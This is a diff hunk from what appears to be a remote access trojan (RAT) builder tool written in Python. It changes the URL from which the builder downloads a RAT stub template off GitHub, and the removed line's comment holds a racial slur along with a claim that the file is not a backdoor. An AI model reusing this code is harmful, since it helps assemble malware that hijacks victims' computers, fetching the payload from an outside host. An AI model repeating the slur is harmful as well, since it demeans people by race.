@@ -27,7 +27,7 @@ def rat_builder_init():
         try:
             import urllib.request
             os.makedirs(os.path.dirname(stub_template), exist_ok=True)
-            url = "https://raw.githubusercontent.com/glockinhand/glockinhand/refs/heads/main/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
+            url = "https://raw.githubusercontent.com/c7s89r/nzv-tools/main/modules/stub/rat_stub.txt"
             urllib.request.urlretrieve(url, stub_template)
             print(Colorate.Horizontal(_cl["head"], "  [+] File downloaded successfully."))
         except Exception as e:
